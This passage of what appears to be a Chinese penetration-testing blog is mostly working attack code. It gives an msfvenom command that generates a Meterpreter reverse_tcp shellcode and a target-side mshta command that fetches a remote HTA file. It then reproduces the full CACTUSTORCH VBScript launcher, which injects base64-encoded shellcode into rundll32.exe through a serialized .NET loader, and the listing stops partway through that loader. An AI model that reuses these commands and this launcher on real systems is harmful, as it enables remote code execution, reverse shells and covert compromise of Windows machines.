<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐a x86 ‐‐platform windows ‐p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.16 8.1.4 LPORT&#x3D;53 ‐f raw &gt; shellcode.bin</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat shellcode.bin |base64 ‐w 0</span><br><span class="line">&#x2F;&#x2F; 替换Hta中Dim code : code部分</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>靶机执行</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe http:&#x2F;&#x2F;192.168.1.4&#x2F;Micropoor.hta</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Micropoor.hta</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">&#39;                                (              )  (            )  </span><br><span class="line">&#39;   (    (       (    *   )      )\ )  *   ) ( &#x2F;(  )\ )  (   ( &#x2F;(  </span><br><span class="line">&#39;   )\   )\      )\ &#96; )  &#x2F;(   ( (()&#x2F;(&#96; )  &#x2F;( )\())(()&#x2F;(  )\  )\()) </span><br><span class="line">&#39; (((_|(((_)(  (((_) ( )(_))  )\ &#x2F;(_))( )(_)|(_)\  &#x2F;(_)|((_)((_)\  </span><br><span class="line">&#39; )\___)\ _ )\ )\___(_(_())_ ((_|_)) (_(_())  ((_)(_)) )\___ _((_) </span><br><span class="line">&#39;((&#x2F; __(_)_\(_|(&#x2F; __|_   _| | | &#x2F; __||_   _| &#x2F; _ \| _ ((&#x2F; __| || | </span><br><span class="line">&#39; | (__ &#x2F; _ \  | (__  | | | |_| \__ \  | |  | (_) |   &#x2F;| (__| __ | </span><br><span class="line">&#39;  \___&#x2F;_&#x2F; \_\  \___| |_|  \___&#x2F;|___&#x2F;  |_|   \___&#x2F;|_|_\ \___|_||_| </span><br><span class="line">&#39;                                                                 </span><br><span class="line">&#39; Author: Vincent Yiu (@vysecurity)</span><br><span class="line">&#39; Credits:</span><br><span class="line">&#39;   - @cn33liz: Inspiration with StarFighter</span><br><span class="line">&#39;   - @tiraniddo: James Forshaw for DotNet2JScript</span><br><span class="line">&#39;   - @armitagehacker: Raphael Mudge for idea of selecting 32 bit version on 64 bit architecture machines for injection into</span><br><span class="line"></span><br><span class="line">&#39; A HTA shellcode launcher. This will spawn a 32 bit version of the binary specified and inject shellcode into it.</span><br><span class="line"></span><br><span class="line">&#39; Usage:</span><br><span class="line">&#39; Choose a binary you want to inject into, default &quot;rundll32.exe&quot;, you can use notepad.exe, calc.exe for example...</span><br><span class="line">&#39; Generate a 32 bit raw shellcode in whatever framework you want. Tested: Cobalt Strike, Metasploit Framework</span><br><span class="line">&#39; Run: cat payload.bin | base64 -w 0</span><br><span class="line">&#39; Copy the base64 encoded payload into the code variable below.</span><br><span class="line"></span><br><span class="line">&#39; Replace with binary name that you want to inject into. This can be anything that exists both in SYSWOW64 and SYSTEM32</span><br><span class="line">Dim binary : binary &#x3D; &quot;rundll32.exe&quot;</span><br><span class="line"></span><br><span class="line">&#39; Base64 encoded 32 bit shellcode</span><br><span class="line">Dim code : code &#x3D; &quot;TVroAAAAAFtSRVWJ5YHDcoAAAP&#x2F;TicNXaAQAAABQ&#x2F;9Bo8LWiVmgFAAAAUP&#x2F;TAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACf0hwW27NyRduzckXbs3JFZvzkRdqzckXF4fZF8rNyRcXh50XIs3JFxeHxRVqzckX8dQlF1LNyRduzc0UGs3JFxeH7RWKzckXF4eBF2rNyRcXh40Xas3JFUmljaNuzckUAAAAAAAAAAAAAAAAAAAAAUEUAAEwBBQBOViNZAAAAAAAAAADgAAKhCwEJAABCAgAA4gAAAAAAAFFvAQAAEAAAAGACAAAAABAAEAAAAAIAAAUAAAAAAAAABQAAAAA&quot;</span><br><span class="line"></span><br><span class="line">&#39; ---------- DO NOT EDIT BELOW HERE -----------</span><br><span class="line"></span><br><span class="line">Sub Debug(s)</span><br><span class="line">End Sub</span><br><span class="line">Sub SetVersion</span><br><span class="line">End Sub</span><br><span class="line">Function Base64ToStream(b)</span><br><span class="line">  Dim enc, length, ba, transform, ms</span><br><span class="line">  Set enc &#x3D; CreateObject(&quot;System.Text.ASCIIEncoding&quot;)</span><br><span class="line">  length &#x3D; enc.GetByteCount_2(b)</span><br><span class="line">  Set transform &#x3D; CreateObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;)</span><br><span class="line">  Set ms &#x3D; CreateObject(&quot;System.IO.MemoryStream&quot;)</span><br><span class="line">  ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length &#x2F; 4) * 3)</span><br><span class="line">  ms.Position &#x3D; 0</span><br><span class="line">  Set Base64ToStream &#x3D; ms</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Sub Run</span><br><span class="line">Dim s, entry_class</span><br><span class="line">s &#x3D; &quot;AAEAAAD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZW1ibHkGFwAAAARMb2FkCg8MAAAAAB4AAAJNWpAAAwAAAAQAAAD&#x2F;&#x2F;wAAuAAAAAAAAABAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAkNhXWQAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAA4AAiIAsBMAAAFgAAAAYAAAAAAAByNQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAIDUA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AE8AAAAAQAAAkAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAALnRleHQAAAB4FQAAACAAAAAWAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAkAMAAABA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAABAAAABgAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAcAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAFQ1AAAAAAAASAAAAAIABQD4IQAAKBMAAAEAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgIoDwAACioT&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;MAoABwEAAAEAABEEKBAAAAoKEgEGjmkoEQAACnMJAAAGDAgWfTUAAARyAQAAcBMEcgMAAHAoEgAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;Cm8TAAAKFjEZch0AAHAoEgAACnIrAABwAygUAAAKEwQrF3IdAABwKBIAAApyQQAAcAMoFAAAChME&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;EQQUFBQXGn4VAAAKFAgSAygBAAAGJgl7BAAABBMFEgUoFgAACnJXAABwKBcAAAosbhEFFnMRAAAK&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ByAAMAAAH0AoAgAABhMGEgYoFgAACnJXAABwKBgAAAosChEFFigEAAAGJioWEwcSCAaOaSgRAAAK&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;EQURBgYRCBEHKAMAAAYmEQUWcxEAAAoWEQYWcxEAAAoWFnMRAAAKKAUAAAYmKnoCfhUAAAp9AgAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;BAIoDwAACgICKBkAAAp9AQAABCoAABMwAgBgAAAAAAAAAAJ+FQAACn0rAAAEAn4VAAAKfSwAAAQC&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;fhUAAAp9LQAABAJ+FQAACn04AAAEAn4VAAAKfTkAAAQCfhUAAAp9OgAABAJ+FQAACn07AAAEAigP&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAKAgIoGQAACn0qAAAEKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAACgHAAAj&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;fgAAlAcAAEwJAAAjU3RyaW5ncwAAAADgEAAAXAAAACNVUwA8EQAAEAAAACNHVUlEAAAATBEAANwB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAjQmxvYgAAAAAAAAACAAABVx0CFAkCAAAA+gEzABYAAAEAAAAXAAAACQAAAFAAAAAJAAAAHwAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ABkAAAAzAAAAEgAAAAEAAAABAAAABQAAAAEAAAABAAAABwAAAAAAmQYBAAAAAAAGAFwFkgcGAMkF&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;kgcGAIoEYAcPALIHAAAGALIE4QYGADAF4QYGABEF4QYGALAF4QYGAHwF4QYGAJUF4QYGAMkE4QYG&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AJ4EcwcGAHwEcwcGAPQE4QYGAKsIqQYGAGEEqQYGAE0FqQYGALAGqQYGAMoIqQYGAFkHqQYGAL4I&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;qQYGAGYGqQYGAIQGcwcAAAAAJQAAAAAAAQABAAEAEABtBgAAPQABAAEACgAQAPgHAAA9AAEACAAK&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ARAAzgYAAEEABAAJAAIBAAAbCAAASQAIAAkAAgEAADYIAABJACcACQAKABAABgcAAD0AKgAJAAIB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AABtBAAASQA8AAoAAgEAAPMGAABJAEUACgAGAH0G+gAGAEQHPwAGACQE&#x2F;QAGAHQIPwAGAOcDPwAG&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AMgD+gAGAL0D+gAGBp4DAAFWgLICAwFWgMACAwFWgGQAAwFWgIgCAwFWgMIAAwFWgFMCAwFWgPEB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AwFWgB0CAwFWgAUCAwFWgKABAwFWgAIDAwFWgF4BAwFWgEgBAwFWgOEBAwFWgE0CAwFWgDECAwFW&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;gGoDAwFWgIIDAwFWgJkCAwFWgB0DAwFWgHYBAwFWgHUAAwFWgD0AAwFWgCcBAwFWgKgAAwFWgDoD&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AwFWgLkBAwFWgBgBAwFWgMYBAwFWgOUCAwEGBp4DAAFWgJEABwFWgHICBwEGAKYD+gAGAO8DPwAG&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ABcHPwAGADMEPwAGAEsD+gAGAJoD+gAGAOcF+gAGAO8F+gAGAEcI+gAGAFUI+gAGAOQE+gAGAC4I&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;+gAGAOcICwEGAA0ACwEGABkAPwAGANIIPwAGANwIPwAGADQHPwAGBp4DAAFWgN4CDgFWgO8ADgFW&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;gJ0BDgFWgNgCDgFWgNUBDgFWgA8BDgFWgJQBDgFWgAMBDgEGBp4DAAFWgOcAEgFWgFcAEgFWgNUA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;EgFWgFgDEgFWgGkCEgFWgE8DEgFWgN0AEgFWgGADEgFWgBEGEgFWgCQGEgFWgDkGEgEAAAAAgACW&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;IC4AFgEBAAAAAACAAJYg8wgqAQsAAAAAAIAAliAJCTUBEAAAAAAAgACWIGMIPwEVAAAAAACAAJEg&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;1ANFARcAUCAAAAAAhhg+BwYAHgBYIAAAAACGAE0EUAEeAGshAAAAAIYYPgcGACAAjCEAAAAAhhg+&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;BwYAIAAAAAEAOwQAAAIAUwQAAAMA5AcAAAQA0QcAAAUAwQcAAAYACwgAAAcAvAgAAAgAHAkBAAkA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;BAcCAAoAzAYAAAEAGwQAAAIAiwgAAAMAAwYAAAQAawQAAAUAsggAAAEAdAgAAAIAfQgAAAMAIQcA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAQAAwYAAAUAtQYAAAEAdAgAAAIA+gMAAAEAdAgAAAIA0QcAAAMA9wUAAAQAlQgAAAUAKAcAAAYA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;CwgAAAcAsgMAAAEAAgkAAAIAAQAJAD4HAQARAD4HBgAZAD4HCgApAD4HEAAxAD4HEAA5AD4HEABB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AD4HEABJAD4HEABRAD4HEABZAD4HEABhAD4HFQBpAD4HEABxAD4HEACJAD4HBgB5AD4HBgCZAFMG&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;KQChAD4HAQCpAAQELwCxAHkGNACxAKQIOAChABIHPwChAGQGQgCxADsJRgCxAC8JRgC5AAoGTAAJ&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ACQAWgAJACgAXwAJACwAZAAJADAAaQAJADQAbgAJADgAcwAJADwAeAAJAEAAfQAJAEQAggAJAEgA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;hwAJAEwAjAAJAFAAkQAJAFQAlgAJAFgAmwAJAFwAoAAJAGAApQAJAGQAqgAJAGgArwAJAGwAtAAJ&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AHAAuQAJAHQAvgAJAHgAwwAJAHwAyAAJAIAAzQAJAIQA0gAJAIgA1wAJAIwA3AAJAJAA4QAJAJQA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;5gAJAJgA6wAJAKAAWgAJAKQAXwAJAPQAlgAJAPgAmwAJAPwA8AAJAAABuQAJAAQB4QAJAAgB9QAJ&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAwBvgAJABABwwAJABgBbgAJABwBcwAJACABeAAJACQBfQAJACgBWgAJACwBXwAJADABZAAJADQB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;aQAJADgBggAJADwBhwAJAEABjAAuAAsAVgEuABMAXwEuABsAfgEuACMAhwEuACsAhwEuADMAmAEu&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ADsAmAEuAEMAhwEuAEsAhwEuAFMAmAEuAFsAngEuAGMApAEuAGsAzgFDAFsAngGjAHMAWgDDAHMA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;WgADAXMAWgAjAXMAWgAaAIwGAAEDAC4AAQAAAQUA8wgBAAABBwAJCQEAAAEJAGMIAQAAAQsA1AMB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AASAAAABAAAAAAAAAAAAAAAAAPcAAAACAAAAAAAAAAAAAABRAKkDAAAAAAMAAgAEAAIABQACAAYA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AgAHAAIACAACAAkAAgAAAAAAAHNoZWxsY29kZTMyAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyADxN&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;b2R1bGU+AENyZWF0ZVByb2Nlc3NBAENSRUFURV9CUkVBS0FXQVlfRlJPTV9KT0IARVhFQ1VURV9S&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;RUFEAENSRUFURV9TVVNQRU5ERUQAUFJPQ0VTU19NT0RFX0JBQ0tHUk9VTkRfRU5EAERVUExJQ0FU&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;RV9DTE9TRV9TT1VSQ0UAQ1JFQVRFX0RFRkFVTFRfRVJST1JfTU9ERQBDUkVBVEVfTkVXX0NPTlNP&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;TEUARVhFQ1VURV9SRUFEV1JJVEUARVhFQ1VURQBSRVNFUlZFAENBQ1RVU1RPUkNIAFdSSVRFX1dB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VENIAFBIWVNJQ0FMAFBST0ZJTEVfS0VSTkVMAENSRUFURV9QUkVTRVJWRV9DT0RFX0FVVEhaX0xF&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VkVMAENSRUFURV9TSEFSRURfV09XX1ZETQBDUkVBVEVfU0VQQVJBVEVfV09XX1ZETQBQUk9DRVNT&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;X01PREVfQkFDS0dST1VORF9CRUdJTgBUT1BfRE9XTgBHTwBDUkVBVEVfTkVXX1BST0NFU1NfR1JP&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VVAAUFJPRklMRV9VU0VSAFBST0ZJTEVfU0VSVkVSAExBUkdFX1BBR0VTAENSRUFURV9GT1JDRURP&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;UwBJRExFX1BSSU9SSVRZX0NMQVNTAFJFQUxUSU1FX1BSSU9SSVRZX0NMQVNTAEhJR0hfUFJJT1JJ&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VFlfQ0xBU1MAQUJPVkVfTk9STUFMX1BSSU9SSVRZX0NMQVNTAEJFTE9XX05PUk1BTF9QUklPUklU&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;WV9DTEFTUwBOT0FDQ0VTUwBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MAREVUQUNIRURfUFJPQ0VTUwBD&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;UkVBVEVfUFJPVEVDVEVEX1BST0NFU1MAREVCVUdfUFJPQ0VTUwBERUJVR19PTkxZX1RISVNfUFJP&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;Q0VTUwBSRVNFVABDT01NSVQAQ1JFQVRFX0lHTk9SRV9TWVNURU1fREVGQVVMVABDUkVBVEVfVU5J&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;Q09ERV9FTlZJUk9OTUVOVABFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5UAENSRUFURV9OT19X&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;SU5ET1cAZHdYAFJFQURPTkxZAEVYRUNVVEVfV1JJVEVDT1BZAElOSEVSSVRfUEFSRU5UX0FGRklO&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;SVRZAElOSEVSSVRfQ0FMTEVSX1BSSU9SSVRZAGR3WQB2YWx1ZV9fAGNiAG1zY29ybGliAGxwVGhy&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZWFkSWQAZHdUaHJlYWRJZABkd1Byb2Nlc3NJZABDcmVhdGVSZW1vdGVUaHJlYWQAaFRocmVhZABs&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;cFJlc2VydmVkAHVFeGl0Q29kZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAGxwSGFuZGxlAGJJbmhl&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;cml0SGFuZGxlAGxwVGl0bGUAbHBBcHBsaWNhdGlvbk5hbWUAZmxhbWUAbHBDb21tYW5kTGluZQBW&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;YWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1&quot;</span><br><span class="line">s 